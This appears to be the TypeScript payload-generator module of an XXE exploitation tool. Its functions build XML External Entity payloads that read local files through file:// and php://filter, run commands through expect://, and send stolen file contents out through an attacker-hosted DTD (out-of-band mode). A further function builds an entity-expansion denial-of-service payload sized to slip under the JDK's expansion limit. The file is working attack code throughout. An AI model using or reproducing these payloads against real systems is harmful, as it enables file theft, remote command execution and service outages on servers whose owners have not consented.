import { XXEServer } from "./XXEServer";

export interface Entity {
  name: string;
  value: string;
  parameter: boolean;
  system: boolean;
}

export enum Type {
  file = 1, request = 2, expect = 3
}

export enum Mode {
  XML = 1, OOB = 2, CDATA = 3
}

export enum Encoding {
  NORMAL = 1,
  PHP_BASE64 = 2
}

export class PayloadGenerator {

  public static PLACEHOLDER = "{{XXE}}";
  public static PLACEHOLDER_REQUEST_B64 = "{{XXE_B64}}";


  private static DOCTYPE_NAME = "xxe";


  public static generate(t: Type, mode: Mode, encoding: Encoding, path: string, template = PayloadGenerator.defaultTemplate()): string {

    let entities: Array<Entity | string> = [];
    let content: string;

    switch (t) {
      case Type.expect: content = PayloadGenerator.expectStream(path); break;
      case Type.file: content = PayloadGenerator.fileStream(path); break;
      case Type.request: content = path; break;
    }

    const server = new XXEServer();


    switch (mode) {
      case Mode.XML:
        entities = [{ name: "payload", value: content, parameter: false, system: true }];
        break;
      case Mode.CDATA:
        {
          const dtdUrl = server.addRoute(`/cdata.dtd`, PayloadGenerator.generateCdataDTD(path));

          entities = [
            { name: "extDTD", value: `${dtdUrl}`, parameter: true, system: true },
            "%extDTD;",
            "%all;"
          ];
          break;
        }
      case Mode.OOB: {
        const extractionEnt = { name: "dataextractionfile", parameter: true, value: content, system: true };
        const extractionUrl = server.addRoute("/extraction.dtd", PayloadGenerator.generateExtractionDTD(extractionEnt, encoding));
        entities = [
          { name: "extDTD", value: extractionUrl, parameter: true, system: true },
          "%extDTD;",
          "%extraction;",
          "%OOB;"];
        break;
      }
    }

    if (mode === Mode.CDATA || mode === Mode.OOB) server.start();

    const docType = PayloadGenerator.createDocType(entities);
    const xml = PayloadGenerator.injectDocType(template, docType);

    if (mode === Mode.XML)
      return PayloadGenerator.replacePlaceholderWithEntity(xml, "payload");
    else
      return xml;

  }


  //TODO: need to improve this. 
  //maxNumberOfExpantions should be NumberOfExpantions.
  //JDK has a limit of 64000 expansions :( 
  public static xee(maxNumberOfExpantions = 64000, template: string = PayloadGenerator.defaultTemplate()): string {
    const entities = [{
      name: "ent0",
      system: false,
      value: "Ea velit aute anim voluptate aliquip id aute dolore do culpa nisi quis officia sunt quis elit ex sed elit."
    }];

    const b = 10;
    let i = 1;
    let expantions = 1;
    while ((expantions * b) <= maxNumberOfExpantions) {

      const ent = { name: "ent" + i, value: PayloadGenerator.callEntity("ent" + (i - 1)).repeat(b), system: false };
      entities.push(ent);

      i++;
      expantions = expantions * b;
    }


    const tmp = PayloadGenerator.createDocType(entities) + template;
    return PayloadGenerator.replacePlaceholderWithEntity(tmp, "ent" + (i - 1));
  }




  private static generateCdataDTD(payloadAction: string): string {

    let payload =
      PayloadGenerator.createEntityString({ name: "start", value: `<![CDATA[`, parameter: true, system: false }) +
      PayloadGenerator.createEntityString({ name: "path", value: payloadAction, parameter: true, system: true }) +
      PayloadGenerator.createEntityString({ name: "end", value: `]]>`, parameter: true, system: false });

    const subEntity = PayloadGenerator.createEntityString({
      name: "content",
      value: `%start;%path;%end;`,
      parameter: false,
      system: false
    }, Encoding.NORMAL, true);

    payload += PayloadGenerator.createEntityString({ name: "all", value: subEntity, parameter: true, system: false });

    return payload;
  }


  private static generateExtractionDTD(entity: Entity, encoding: Encoding): string {
    //TODO: change this. we can now generate this case with createEntityString
    return PayloadGenerator.createEntityString(entity, encoding) +
      `<!ENTITY % extraction "<!ENTITY &#x25; OOB SYSTEM '${XXEServer.getServerUrl()}/?p=%${entity.name};'>">\n`;
  }




  //TODO: allow to change doctype name
  private static createDocType(entities: any): string {
    let dt = `<!DOCTYPE ${PayloadGenerator.DOCTYPE_NAME} [\n`;
    entities.forEach((e: any) => {
      if (typeof e === 'string')
        dt += "   " + e + "\n";
      else
        dt += "   " + PayloadGenerator.createEntityString(e);
    });
    dt += "]>\n";

    return dt;
  }


  //inner param is to know if this entity is inside another
  private static createEntityString(entity: Entity, encoding: Encoding = Encoding.NORMAL, inner = false): string {
    let p = " ";
    let system = " ";
    if (entity.parameter) {
      if (inner)
        p = " &#x25; ";
      else
        p = " % ";
    }

    let val = entity.value;


    if ((encoding & Encoding.PHP_BASE64) > 0)
      val = "php://filter/read=convert.base64-encode/resource=file://" + val;

    if (entity.system)
      system = " SYSTEM ";

    if (inner)
      return `<!ENTITY${p}${entity.name}${system}'${val}'>`;
    else
      return `<!ENTITY${p}${entity.name}${system}"${val}">\n`;

  }

  private static injectDocType(xmlContent: string, docType: string): string {
    if (xmlContent.includes("<?xml")) {
      const startIndex = xmlContent.indexOf("<?xml");
      const endIndex = xmlContent.indexOf(">", startIndex);
      const xmlDcl = xmlContent.substring(startIndex, endIndex + 1);

      return xmlDcl + "\n" + docType + xmlContent.replace(xmlDcl, "");
    }
    else
      return docType + xmlContent;

  }

  private static generateString(): string {
    return Math.random().toString(36).substring(7);
  }

  private static callEntity(entityName: string): string {
    return `&${entityName};`;
  }

  private static defaultTemplate(): string {
    return `<?xml version="1.0" encoding="UTF-8"?>
    <xxeexploiter>
      <value>{{XXE}}</value>
    </xxeexploiter>`;
  }

  private static replacePlaceholderWithEntity(xmlPayload: string, entityName: string): string {
    return xmlPayload.replace(PayloadGenerator.PLACEHOLDER, `${PayloadGenerator.callEntity(entityName)}`);
  }

  private static fileStream(file: string): string {
    return "file://" + file;
  }

  private static expectStream(file: string): string {
    return "expect://" + file;
  }

}